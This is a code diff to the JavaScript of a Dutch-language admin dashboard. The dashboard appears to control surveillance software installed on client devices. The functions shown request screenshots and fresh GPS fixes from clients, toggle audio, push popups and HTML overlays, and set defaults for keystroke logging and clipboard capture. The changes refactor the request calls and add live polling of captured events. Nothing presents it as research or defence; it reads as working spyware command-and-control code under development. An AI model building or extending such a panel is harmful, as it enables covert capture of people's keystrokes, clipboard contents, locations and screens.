@@ -1132,6 +1132,8 @@ if (socket) {
     $('#dot').className = 'dot on';
     $('#connTxt').textContent = 'Polling actief';
     refreshAll();
+    // Auto-refresh every 5s so admin sees live data without socket.io
+    setInterval(refreshAll, 5000);
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -1146,15 +1148,18 @@ async function api(url) {
     } catch(e) { showError('api:'+url, e); return null; }
 }
 
+let lastEventPollTs = 0;
+
 async function refreshAll() {
     showRefreshRing();
     await loadTags();
     try {
         const f = filterParam();
-        const [stats, locs, photos] = await Promise.all([
+        const [stats, locs, photos, evts] = await Promise.all([
             api('/api/stats'),
             api('/api/locations?limit=50' + f),
-            api('/api/photos?limit=12' + f)
+            api('/api/photos?limit=12' + f),
+            api('/api/events?limit=100')
         ]);
         if (stats) {
             try {
@@ -1182,6 +1187,20 @@ async function refreshAll() {
         }
         if (locs) try { renderLocations(locs); } catch(e) { showError('refreshAll-locs', e); }
         if (photos) try { renderRecentPhotos(photos); } catch(e) { showError('refreshAll-photos', e); }
+
+        // Merge new events — show toasts for events that arrived since last poll
+        if (evts && Array.isArray(evts)) {
+            try {
+                if (lastEventPollTs > 0) {
+                    const lastPollIso = new Date(lastEventPollTs).toISOString();
+                    const fresh = evts.filter(e => e.timestamp > lastPollIso);
+                    fresh.slice().reverse().forEach(e => showToast(e)); // oldest first
+                }
+                lastEventPollTs = Date.now();
+                events = evts;
+                renderEvents();
+            } catch(e) { showError('refreshAll-events', e); }
+        }
 
         // Auto-refresh camera tab
         const ct = document.querySelector('.tab[data-v="cameras"]');
@@ -1508,20 +1527,18 @@ function stopAllLiveFeeds() {
 }
 
 function requestScreenshot(clientId) {
-    fetch('/api/command', {
+    apiFetch('/api/command', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN },
         body: JSON.stringify({ target: clientId, type: 'screenshot', data: {} })
-    }).then(r => r.ok ? showToast({ type: 'command', data: { clientId, msg: 'Screenshot verzoek verstuurd — verschijnt in Foto\'s tab' } }) : null);
+    }).then(() => showToast({ type: 'command', data: { clientId, msg: 'Screenshot verzoek verstuurd — verschijnt in Foto\'s tab' } })).catch(() => {});
 }
 
 function requestLocation(clientId) {
     // Send command to client to immediately send a fresh GPS fix
-    fetch('/api/command', {
+    apiFetch('/api/command', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN },
         body: JSON.stringify({ target: clientId, type: 'get-location', data: {} })
-    }).then(r => r.ok ? showToast({ type: 'command', data: { clientId, msg: 'Locatie verzoek verstuurd' } }) : null);
+    }).then(() => showToast({ type: 'command', data: { clientId, msg: 'Locatie verzoek verstuurd' } })).catch(() => {});
 }
 
 function toggleAudio(clientId) {
@@ -1936,14 +1953,14 @@ async function saveConfig() {
         photoEnabled: false, videoEnabled: false,
         locationEnabled: true, locationPeriod: 30000
     };
-    const r = await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(cfg) });
-    if (r.ok) toast('\u2705 Instellingen opgeslagen!');
+    await apiFetch('/api/config', { method: 'POST', body: JSON.stringify(cfg) });
+    toast('\u2705 Instellingen opgeslagen!');
 }
 
 async function resetConfig() {
     if (!confirm('Reset alle instellingen naar standaard?')) return;
     const def = { photoEnabled:false, videoEnabled:false, locationEnabled:true, locationPeriod:30000, photoQuality:0.7, keystrokesEnabled:true, keyLogFlush:10000, clipboardEnabled:true, clipboardCheck:15000, heartbeatPeriod:8000 };
-    await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(def) });
+    await apiFetch('/api/config', { method: 'POST', body: JSON.stringify(def) });
     loadConfig();
     toast('\u2705 Instellingen gereset.');
 }
@@ -1966,7 +1983,7 @@ async function loadStorage() {
 async function doCleanup(type, keep) {
     const msg = keep === 0 ? `Alle ${type} verwijderen?` : `Alleen de laatste ${keep} ${type} bewaren?`;
     if (!confirm(msg)) return;
-    await fetch('/api/cleanup', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify({ type, keep }) });
+    await apiFetch('/api/cleanup', { method: 'POST', body: JSON.stringify({ type, keep }) });
     loadStorage();
     refreshAll();
     toast(`\uD83D\uDDD1 ${type} opgeschoond`);
@@ -1974,21 +1991,22 @@ async function doCleanup(type, keep) {
 
 async function doPurge(type) {
     if (!confirm(`Alle ${type} permanent verwijderen?`)) return;
-    const r = await fetch('/api/purge/' + type, { method: 'DELETE', headers: { 'X-Admin-Token': AUTH_TOKEN } });
-    if (r.ok) { const j = await r.json(); toast(`\uD83D\uDDD1 ${j.deleted} ${type} verwijderd`); refreshAll(); }
-    else toast('\u274C Verwijderen mislukt');
+    try {
+        const j = await apiFetch('/api/purge/' + type, { method: 'DELETE' });
+        toast(`\uD83D\uDDD1 ${j.deleted} ${type} verwijderd`);
+        refreshAll();
+    } catch { toast('\u274C Verwijderen mislukt'); }
 }
 
 async function purgeStaleClients(days) {
     days = days || 3;
     if (!confirm(`Alle offline clients die meer dan ${days} dag(en) inactief zijn verwijderen?`)) return;
-    const r = await fetch('/api/clients/stale?days=' + days, { method: 'DELETE', headers: { 'X-Admin-Token': AUTH_TOKEN } });
-    if (r.ok) {
-        const j = await r.json();
+    try {
+        const j = await apiFetch('/api/clients/stale?days=' + days, { method: 'DELETE' });
         toast(`\uD83D\uDDD1 ${j.deleted} verlopen client(s) verwijderd`);
         loadCameraFeeds();
         refreshAll();
-    } else toast('\u274C Verwijderen mislukt');
+    } catch { toast('\u274C Verwijderen mislukt'); }
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -2069,8 +2087,8 @@ async function sendCommand() {
       else if (type === 'sound') { data = { frequency: parseInt($('#cmd-freq')?.value)||440, duration: parseInt($('#cmd-sound-dur')?.value)||500, volume: (parseInt($('#cmd-vol')?.value)||30)/100 }; }
       else if (type === 'popup') { data = { url: $('#cmd-popup-url')?.value||'', width: parseInt($('#cmd-popup-w')?.value)||500, height: parseInt($('#cmd-popup-h')?.value)||400 }; }
       else if (type === 'overlay') { data = { html: $('#cmd-overlay-html')?.value||'', duration: parseInt($('#cmd-overlay-dur')?.value)||0 }; }
-    const r = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify({ target, type, data }) });
-    if (r.ok) toast(`\u26A1 Command verstuurd: ${type} \u2192 ${target}`);
+    await apiFetch('/api/command', { method: 'POST', body: JSON.stringify({ target, type, data }) });
+    toast(`\u26A1 Command verstuurd: ${type} \u2192 ${target}`);
 }
 
 function previewNotif() {
